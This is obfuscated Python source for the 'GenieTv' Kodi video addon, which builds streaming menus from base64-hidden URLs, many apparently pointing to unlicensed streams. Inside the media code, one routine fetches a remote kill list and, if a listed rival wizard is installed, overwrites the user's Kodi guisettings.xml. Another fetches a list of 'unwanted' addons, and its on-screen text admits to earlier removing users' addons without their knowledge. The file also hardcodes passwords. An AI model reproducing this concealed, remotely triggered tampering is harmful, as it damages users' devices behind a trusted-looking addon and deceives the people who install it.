# -*- coding: cp1252 -*-
import xbmc , xbmcaddon , xbmcgui , xbmcplugin , os , base64 , sys , xbmcvfs , unicodedata
import urlresolver
from imports import cloudflare , googleplus , client , cleantitle , cache
from imports import yt
import httplib
import requests
import urlparse
import shutil
import binascii
import subprocess
import urllib2 , urllib , glob , traceback
import re
from imports import extract
from imports import downloader
import plugintools
import zipfile
import time
import ntpath
import cookielib
from imports import Parse , CNF_Studio_Indexer
try :
 import json
except :
 import simplejson as json
from urllib2 import urlopen
from bs4 import BeautifulSoup
from BeautifulSoup import BeautifulStoneSoup , BeautifulSOAP
from cookielib import CookieJar
from addon . common . addon import Addon
from addon . common . net import Net
from imports . tvGuide import gui
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = ''
def oo ( i , t1 , t2 = [ ] ) :
 i1iII1IiiIiI1 = o0OO00
 for iIiiiI1IiI1I1 in t1 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 for iIiiiI1IiI1I1 in t2 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 return i1iII1IiiIiI1
 if 87 - 87: OoOoOO00
 if 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI
 if 73 - 73: OOooOOo / ii11ii1ii
O00ooOO = "2.8.1"
I1iII1iiII = xbmc . translatePath ( 'special://home/addons/repository.GenieTv' )
iI1Ii11111iIi = xbmc . translatePath ( 'special://home/addons/' )
i1i1II = xbmc . translatePath ( 'special://home/addonsbroke/' )
O0oo0OO0 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'
I1i1iiI1 = 'plugin.video.GenieTv'
iiIIIII1i1iI = [ 'plugin.video.GenieTv' , 'script.module.addon.common' , 'repository.GenieTv' ]
o0oO0 = xbmcaddon . Addon ( id = I1i1iiI1 )
oo00 = xbmc . translatePath ( 'special://home/media' )
o00 = 'plugin.video.GenieTv'
Oo0oO0ooo = xbmcgui . DialogProgress ( )
o0oOoO00o = "[COLORgreen]GenieTv[/COLOR]"
i1 = Net ( )
oOOoo00O0O = xbmcgui . Dialog ( )
i1111 = base64 . decodestring
i11 = o0oO0 . getSetting ( 'Build' )
I11 = o0oO0 . getSetting ( 'Local' )
Oo0o0000o0o0 = o0oO0 . getSetting ( 'Remote' )
oOo0oooo00o = o0oO0 . getSetting ( 'LocalM3u' )
oO0o0o0ooO0oO = o0oO0 . getSetting ( 'User' )
oo0o0O00 = o0oO0 . getSetting ( 'Pass' )
oO = o0oO0 . getSetting ( 'AdultPass' )
i1iiIIiiI111 = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'fanart.jpg' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'icon.png' , i1iiIII111ii , '' ) )
ii11iIi1I = ( i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9HZW5pZUFydC8=' ) )
iI111I11I1I1 = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQvb3JpZ2luLnBuZw==' ) )
OOooO0OOoo = xbmc . translatePath ( 'special://database' )
iIii1 = xbmc . translatePath ( 'special://home/userdata/addon_data/plugin.video.GenieTV' )
oOOoO0 = xbmc . translatePath ( 'special://thumbnails' ) ;
O0OoO000O0OO = "GenieTv"
iiI1IiI = ( i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkbw==' ) )
II = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/Change_Log_Temp' ) )
OooO0 = 'http://'
II11iiii1Ii = base64 . decodestring ( 'LnBocA==' )
OO0o = base64 . decodestring ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC8=' )
Ooo = [ ]
O0o0Oo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/imports/tvGuide/ResetDatabase.py' ) )
Oo00OOOOO = o0oO0 . getLocalizedString
O0O = CookieJar ( )
O00o0OO = urllib2 . build_opener ( urllib2 . HTTPCookieProcessor ( O0O ) )
O00o0OO . addheaders = [ ( 'User-Agent' , 'Mozilla/5.0' ) ]
I11i1 = int ( sys . argv [ 1 ] )
iIi1ii1I1 = xbmc . translatePath ( o0oO0 . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
o0 = os . path . join ( iIi1ii1I1 , 'favorites' )
I11II1i = iIii1 + '/addons.ini'
IIIII = xbmc . translatePath ( 'special://home/userdata/' )
ooooooO0oo = xbmc . translatePath ( 'special://home/userdatabroke/' )
IIiiiiiiIi1I1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9QYW5zQm94L09SSUdJTlMv' ) )
I1IIIii = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.ivueguide/master.db' ) )
oOoOooOo0o0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , 'favourites.xml' ) )
OOOO = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/plugin.video.GenieTv/favorites' ) )
OOO00 = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/addon.xml' ) )
iiiiiIIii = xbmc . translatePath ( os . path . join ( 'special://home/addons/Repository.GenieTv/addon.xml' ) )
if os . path . exists ( o0 ) == True :
 O000OO0 = open ( o0 ) . read ( )
else : O000OO0 = [ ]
I11iii1Ii = o0oO0 . getSetting ( 'debug' )
if os . path . exists ( iIii1 ) == False :
 os . makedirs ( iIii1 )
I1IIiiIiii = 'http://architects.x10host.com/safety/index.php?mode=XxX&password=fordfiesta'
if 97 - 97: Ooo0OO0oOO - i11i1 + OOoo0OO0 / oO0O - II1i1IiiIIi11 % iI1Ii11iII1
if 51 - 51: I1I1ii * oOO - OOooOOo - OOOo0 + i11i1 / ii11ii1ii
def I1 ( ) :
 if not os . path . exists ( I1iII1iiII ) :
  oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will only work with" , 'its official repo please install from trusted source' , '' )
  OO00Oo = 'genie tv repo not being installed '
  O0OOO0OOoO0O ( OO00Oo )
 else :
  O00Oo000ooO0 ( )
  if 100 - 100: O0 + iI1Ii11iII1 - i11i1 + i11iIiiIii * oO0O
def iII ( ) :
 if 80 - 80: iI1Ii11iII1 . Ooo0OO0oOO
 IIi = i11iIIIIIi1 ( i1111 ( 'aHR0cHM6Ly9naXRodWIuY29tL0dlbmllVHYvR2VuaWVfVHYvYmxvYi9tYXN0ZXIvVmVyc2lvbl9Mb2cudHh0' ) )
 iiII1i1 = open ( OOO00 ) . read ( )
 o00oOO0o = open ( iiiiiIIii ) . read ( )
 if 80 - 80: Ooo0OO0oOO + i11i1 - i11i1 % II1i1IiiIIi11
 OoOO0oo0o = re . compile ( 'version="(.+?)" provider' ) . findall ( iiII1i1 )
 II11i1I11Ii1i = re . compile ( 'version="(.+?)" provider-name' ) . findall ( o00oOO0o )
 O000O0oOO0 = re . compile ( 'GENIE TV ADDON - Version = &quot;(.+?)&quot;' ) . findall ( IIi )
 O0ooo0O0oo0 = re . compile ( 'GENIE TV REPO - Version = &quot;(.+?)&quot;' ) . findall ( IIi )
 for oo0oOo in OoOO0oo0o :
  o000O0o = oo0oOo
  for iI1iII1 in O000O0oOO0 :
   if not iI1iII1 == o000O0o :
    Oo0oO0ooo . create ( 'Incorrect Addon Version' , 'Downloading Correct Version' , )
    xbmc . sleep ( 1000 )
    Oo0oO0ooo . close
    oO0OOoo0OO ( )
   if iI1iII1 == o000O0o :
    pass
 for O0ii1ii1ii in II11i1I11Ii1i :
  oooooOoo0ooo = O0ii1ii1ii
  for I1I1IiI1 in O0ooo0O0oo0 :
   if not I1I1IiI1 == oooooOoo0ooo :
    Oo0oO0ooo . create ( 'Incorrect Repo Installed' , 'Installing Correct Version' , '' )
    xbmc . sleep ( 1000 )
    Oo0oO0ooo . close
    III1iII1I1ii ( )
   if I1I1IiI1 == oooooOoo0ooo :
    xbmc . sleep ( 100 )
    pass
def oOOo0 ( ) :
 I1 ( )
 oo00O00oO ( )
 O00Oo000ooO0 ( )
 iIiIIIi ( )
 ooo00OOOooO ( '[COLORgreen]Force Genie Update Kodi 16+[/COLOR]' , i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVwby9yZXBvc2l0b3J5LkdlbmllVHYtMC4xLjAuemlw' ) , 10085 , ii11iIi1I + 'updategenie.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'My Build' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]WIZARD[/COLOR]' , iiI1IiI , 4001 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Streams' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]STREAMS[/COLOR]' , iiI1IiI , 4002 , ii11iIi1I + 'streams.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Music' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]Music[/COLOR]' , iiI1IiI , 4003 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
  if 77 - 77: II1i1IiiIIi11 % II1i1IiiIIi11 * Ooo0OO0oOO - i11iIiiIii
 if o0oO0 . getSetting ( 'Builders Toolbox' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]BUILDERS TOOLBOX[/COLOR]' , iiI1IiI , 32 , ii11iIi1I + 'builderstoolbox.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Source List' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]SOURCE LIST[/COLOR]' , iiI1IiI , 46 , ii11iIi1I + 'sources.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Maintainance' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]MAINTENANCE[/COLOR]' , iiI1IiI , 3 , ii11iIi1I + 'MAIN6.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]ADDONS[/COLOR]' , '' , 10050 , ii11iIi1I + 'ADDONS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'APK Tool' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]APK TOOL[/COLOR]' , iiI1IiI , 2 , ii11iIi1I + 'APK.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Rss Feed' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]GenieTv RSS Feed[/COLOR]' , iiI1IiI , 39 , ii11iIi1I + 'RSS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons Packs' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]ADDONS PACKS[/COLOR]' , iiI1IiI , 30 , ii11iIi1I + 'ADDONP.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 1 - 1: Ooo00oOo00o - Ooo0OO0oOO . OOoo0OO0 . Ooo00oOo00o / Oo + OOoo0OO0
def OooOOOOo ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]BACKUP MY BUILD[/COLOR]' , iiI1IiI , 10060 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]RESTORE MY BUILD[/COLOR]' , iiI1IiI , 49 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]WIPE GENIE[/COLOR]' , iiI1IiI , 41 , ii11iIi1I + 'wipegenie.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]WISHES PC[/COLOR]' , iiI1IiI , 1 , ii11iIi1I + 'WISHESPC.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]WISHES ANDROID[/COLOR]' , iiI1IiI , 44 , ii11iIi1I + 'WISHESAN.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
def oo0O0oO ( ) :
 I1 ( )
 if oO == '5knuckleshuffle' :
  O00OOOoOoo0O ( '[COLORgreen]XVID[/COLOR]' , iiI1IiI , 10100 , ii11iIi1I + 'JIZBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Favourites' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]FAVOURITES[/COLOR]' , iiI1IiI , 10057 , ii11iIi1I + 'FAVORITES.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Search' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]SEARCH[/COLOR]' , iiI1IiI , 9000 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'TV GUIDE' ) == 'true' :
  ooo00OOOooO ( '[COLORgreen]TV GUIDE[/COLOR]' , '' , 10063 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]MOVIES[/COLOR]' , iiI1IiI , 4004 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]TV SHOWS[/COLOR]' , iiI1IiI , 4005 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]STREAM TEAM[/COLOR]' , iiI1IiI , 4006 , ii11iIi1I + 'streamteam.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 4007 , ii11iIi1I + 'KIDSv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]HOBBIES[/COLOR]' , iiI1IiI , 4008 , ii11iIi1I + 'hobbies.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'YOUTUBE' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]SEARCH YOUTUBE[/COLOR]' , iiI1IiI , 10064 , ii11iIi1I + 'youtube.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'REQUESTS' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]REQUESTS[/COLOR]' , iiI1IiI + ( i1111 ( 'L1JFUVVFU1RTLnBocA==' ) ) , 10066 , ii11iIi1I + 'requests.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Stand Up' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]STAND UP[/COLOR]' , '' , 10003 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Documentaries' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]DOCUMENTARIES[/COLOR]' , iiI1IiI , 8040 , ii11iIi1I + 'documentary.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Disclose' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]DISCLOSE TV[/COLOR]' , iiI1IiI , 7001 , ii11iIi1I + 'disclose.png' , i1iiIII111ii , '' )
  if 60 - 60: OOOo0
  if 22 - 22: OoOoOO00
 if o0oO0 . getSetting ( 'Playlist Loader' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]PLAYLIST LOADER[/COLOR]' , iiI1IiI , 3000 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
  if 33 - 33: OOoo0OO0
  if 18 - 18: OOooOOo % II1i1IiiIIi11 * O0
  if 87 - 87: i11iIiiIii
  if 93 - 93: ii11ii1ii - Ooo00oOo00o % i11iIiiIii . II1i1IiiIIi11 / II1i1IiiIIi11 - I1I1ii
  if 9 - 9: ii11ii1ii / Oo - OOOo0 / OoooooooOO / iIii1I11I1II1 - OOooOOo
  if 91 - 91: II1i1IiiIIi11 % i1IIi % iIii1I11I1II1
  if 20 - 20: i11i1 % oO0O / oO0O + oO0O
  if 45 - 45: Ooo0OO0oOO - iI1Ii11iII1 - OoooooooOO - Ooo00oOo00o . OoOoOO00 / O0
  if 51 - 51: O0 + II1i1IiiIIi11
  if 8 - 8: Ooo0OO0oOO * I1IiI - oO0O - Ooo00oOo00o * i11i1 % OOOo0
  if 48 - 48: O0
  if 11 - 11: OOoo0OO0 + OoooooooOO - Ooo00oOo00o / OOooOOo + Oo . OoOoOO00
  if 41 - 41: oO0O - O0 - O0
 Oo0oO ( 'movies' , 'MAIN' )
 if 68 - 68: i11i1 % I1I1ii
def oo00O00oO ( ) :
 if not os . path . exists ( ooOoOoo0O ) :
  ooO00OO0 ( 'Change Log 01/05/16 - v2.7.9' , 'Fixing Tv Guide Link Button, should have full pics and most channels showing data in guide now \n\n\nAlso taken a bad source out of movie search and added progress bars so wait time doesnt seem so long' )
  os . makedirs ( ooOoOoo0O )
  if 31 - 31: II1i1IiiIIi11 % II1i1IiiIIi11 % OOoo0OO0
  if 69 - 69: Ooo00oOo00o - Oo + i1IIi / I1I1ii
def ii1 ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Popcorn Box' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]POPCORN BOX[/COLOR]' , iiI1IiI , 7061 , ii11iIi1I + 'popcorn.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Film Trailers[/COLOR]' , i1111 ( 'aHR0cDovL3RoZW1vdmllYm94Lm5ldC9leHBsb3Jl' ) , 10068 , ii11iIi1I + 'movietrailers.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC MOVIES' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]CLASSIC MOVIES[/COLOR]' , '' , 8060 , ii11iIi1I + 'classicmovies.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
def I1iI1iIi111i ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'G-tv' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]G-Tv PRIVATE LIST[/COLOR]' , '' , 10058 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'TV GUIDE' ) == 'true' :
  ooo00OOOooO ( '[COLORgreen]TV GUIDE[/COLOR]' , '' , 10063 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( '[COLORgreen]Link GTV Donators Username and Password to Guide[/COLOR]' , '' , 4010 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if 44 - 44: i1IIi % OoOoOO00 + OOoo0OO0
 if 45 - 45: II1i1IiiIIi11 / II1i1IiiIIi11 + I1I1ii + oOO
def iI111i ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Dizzy Tv' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]DIZZY TV[/COLOR]' , '' , 10018 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Watch Series' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]WATCH SERIES[/COLOR]' , '' , 10040 , ii11iIi1I + 'WATCHSERIES.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]iWATCH SERIES[/COLOR]' , '' , 8020 , ii11iIi1I + 'iwatch.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Recent Episodes' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]RECENT EPISODES[/COLOR]' , iiI1IiI , 8081 , ii11iIi1I + 'recent.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC TV' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]CLASSIC TV[/COLOR]' , iiI1IiI , 8064 , ii11iIi1I + 'classictv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]TV Show Trailers[/COLOR]' , i1111 ( 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj03WkZJUzJBcUF6OCZsaXN0PVBMM2t4NWgyVHJZR3dwVzBWYk5lbnBqLUJLTUJUR2dKUEU=' ) , 10069 , ii11iIi1I + 'tvtrailers.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]TV Show Schedule[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'tvschedule.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
def IIi11i1i1iI1 ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'Scooby Streams' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , iiI1IiI , 1023 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'The Reaper' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]THE REAPER[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'reap.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Pandoras Box' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]PANDORAS BOX[/COLOR]' , iiI1IiI , 10025 , ii11iIi1I + 'PANDORASBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'HeroVision' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]HEROVISION[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tYWluLnBocA==' ) ) , 1016 , ii11iIi1I + 'hero.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Silent Hunter' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 10084 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Redemption Streams' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]Redemption Streams[/COLOR]' , ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'redemption.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]ITV[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9tYWluLnBocA==' ) ) , 1016 , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9pdHZzdHJlYW1zLnBuZw==' ) ) , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 23 - 23: i11iIiiIii + OOooOOo . i1IIi
def o0Ooo00o0Oooo ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 1006 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SILENT HUNTER SCRAPES[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if 84 - 84: OOooOOo % OoOoOO00 . i11iIiiIii / Ooo00oOo00o
 if 80 - 80: I1I1ii . i11iIiiIii - OOooOOo
 if 25 - 25: Ooo00oOo00o
def oOo0oO ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'WCO' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]WATCH CARTOONS ONLINE[/COLOR]' , iiI1IiI , 21004 , ii11iIi1I + 'watchcartoons.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Cartoons' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 10001 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Anime' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]AnimeLand[/COLOR]' , ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2R1YmJlZC1hbmltZQ==' ) ) , 10004 , ii11iIi1I + 'anime.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
def OOOO0oo0 ( ) :
 I1 ( )
 if o0oO0 . getSetting ( 'Football' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]FOOTBALL[/COLOR]' , '' , 10002 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Fitness' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]FITNESS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cuZml0bmVzc2JsZW5kZXIuY29tL3ZpZGVvcw==' ) ) , 7085 , ii11iIi1I + 'FITNESS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Go Fishing' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]Go Fishing[/COLOR]' , iiI1IiI , 8090 , ii11iIi1I + 'gofish.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'GenieTv Kitchen' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]GenieTv Kitchen[/COLOR]' , ( i1111 ( 'aHR0cDovL2Zvb2QubmR0di5jb20vdmlkZW9z' ) ) , 8045 , ii11iIi1I + 'geniekitchen.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 35 - 35: oO0O - OOOo0 % OOooOOo . OoooooooOO % oO0O
 if 47 - 47: II1i1IiiIIi11 - oO0O . OoOoOO00 + OoooooooOO . i11iIiiIii
 if 94 - 94: OOooOOo * oO0O / Oo / oO0O
def iIiIIIi ( ) :
 oO0 = i11iIIIIIi1 ( 'http://architects.x10host.com/wizarddelete.txt' )
 OoOO0oo0o = re . compile ( '<unwanted_wizard =(.+?)</unwanted_wizard>' ) . findall ( oO0 )
 for O0OO0O in OoOO0oo0o :
  print O0OO0O
  O0OO0O = ( str ( O0OO0O ) )
  if os . path . exists ( xbmc . translatePath ( O0OO0O ) ) :
   OO = os . path . join ( IIIII , 'guisettings.xml' )
   OoOoO = open ( OO , "w+" )
   if 43 - 43: i11iIiiIii + Oo * OoOoOO00 * I1I1ii * O0
   OoOoO . write ( r'.' )
   o00oO0oo0OO ( )
  else :
   pass
   if 57 - 57: I1I1ii % oO0O + OOooOOo - Oo
def O00Oo000ooO0 ( ) :
 oO0 = i11iIIIIIi1 ( 'http://genietv.co.uk/genietv_art/testdelete.txt' )
 OoOO0oo0o = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( oO0 )
 for OO00Oo in OoOO0oo0o :
  OO00Oo = ( str ( OO00Oo ) )
  if os . path . exists ( xbmc . translatePath ( OO00Oo ) ) :
   o0O = ( OO00Oo ) . replace ( 'special://home/addons/' , '' )
   ooO00OO0 ( "Please remove any addons or repo's that may alter Genie Tv coding without your knowledge" , "It has been recognised you have \n[COLORred]" + o0O + "[/COLOR]\n installed on your system. In order for genie to function this addon must be removed. \n\nThere have been 'creative differences' between ourselves and this addon. Initially we just stopped our addon from working if this addon was installed, but when private talks were undertaken the 'author' (we use this term very lightly) of this addon gave us a choice, either remove our block or they will tamper with our addon, they then saw fit to host our addon and begin pushing unwanted and unauthorised, potentially malicious updates (we've no idea what they altered and with there approach anything could be possible) so we took steps to remove this addon purely for your protection from alterations to code from, self confessed, unskilled individuals. \n\nHowever the approach we took i guess can be seen as malicious because we did not inform you of actions that altered your device without your knowledge (bar a popup telling you this was happening), for this we apologise, it was a major oversight on our part and made us no better than them. \n\nAll are free to continue to use genie tv at no cost but you must make a decision. A box will soon open and you will need to choose remove or close. If you choose remove you are accepting to remove these addons that we believe have the potential to maliciously alter your device from an unofficial source or if you press close it will close genie, it will not be useable until these addons are remove and you can chose to use whatever addon you see fit at your own risk. \n\nThis is not 'playing god' please dont see it that way but merely protecting our hard work and in the end your experience from this.  We hope this issue resolves itself and things return to normality as much as, if not more than, yourself. Please wait to decide what action you wish to take" )
   xbmc . sleep ( 40000 )
